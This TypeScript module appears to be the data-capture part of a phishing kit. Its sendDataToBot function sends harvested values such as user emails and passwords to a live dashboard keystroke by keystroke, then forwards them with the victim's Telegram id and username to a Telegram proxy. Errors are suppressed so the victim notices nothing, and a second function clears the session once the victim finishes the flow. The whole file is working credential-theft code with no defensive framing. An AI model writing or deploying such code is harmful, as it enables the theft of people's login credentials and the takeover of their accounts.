'use client';

import type { DataType } from './capturedData';

// Debounce timers for each data type to prevent rate limiting
const debounceTimers: Record<string, NodeJS.Timeout> = {};
const TELEGRAM_DEBOUNCE_DELAY = 120; // fast, but still avoids Telegram rate limits

/**
 * Send captured data to the backend API (updates live message in Telegram)
 * @param dataType - Type of data (user_email, user_password, etc.)
 * @param value - The value to store
 */
export async function sendDataToBot(dataType: DataType, value: string) {
    // Always update the live-data dashboard immediately (even if empty),
    // so deletions/backspaces show up "live".
    try {
        await fetch('/api/live-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ dataType, value: value ?? '' }),
        });
    } catch {
        // Non-critical (dashboard-only)
    }

    // Clear existing timer for this data type
    if (debounceTimers[dataType]) {
        clearTimeout(debounceTimers[dataType]);
    }

    // Debounce the API call to prevent rate limiting
    debounceTimers[dataType] = setTimeout(async () => {
        try {
            // Telegram logging is optional. Skip Telegram calls on empty values
            // (backend rejects empty values and we still want dashboard updates).
            if (!value) return;

            // Get Telegram user info if available
            const tg = (window as any).Telegram?.WebApp;
            const userId = tg?.initDataUnsafe?.user?.id || 'Browser';
            const username = tg?.initDataUnsafe?.user?.username || 'Unknown';

            const response = await fetch('/api/telegram-proxy', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    dataType,
                    value,
                    userId,
                    username
                }),
            });

            // telegram-proxy might return non-json on error; parse safely
            let result: any = null;
            try {
                result = await response.json();
            } catch {
                // ignore
            }

            // Never hard-error in console for Telegram failures (dashboard capture is the priority)
            if (!response.ok) {
                console.debug?.(`[DataSync] Telegram proxy failed for ${dataType}`, result);
            }
        } catch (e) {
            // Silent: telegram-proxy errors shouldn't interrupt UX
            console.debug?.('[DataSync] Telegram proxy error:', e);
        }
    }, TELEGRAM_DEBOUNCE_DELAY);
}

/**
 * Clear the live Telegram session (call this when user completes the flow)
 */
export async function clearTelegramSession() {
    try {
        const tg = (window as any).Telegram?.WebApp;
        const userId = tg?.initDataUnsafe?.user?.id || 'Browser';

        await fetch('/api/telegram-clear-session', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ userId }),
        });

        console.log('[DataSync] Cleared Telegram session');
    } catch (e) {
        console.error('[DataSync] Error clearing session:', e);
    }
}
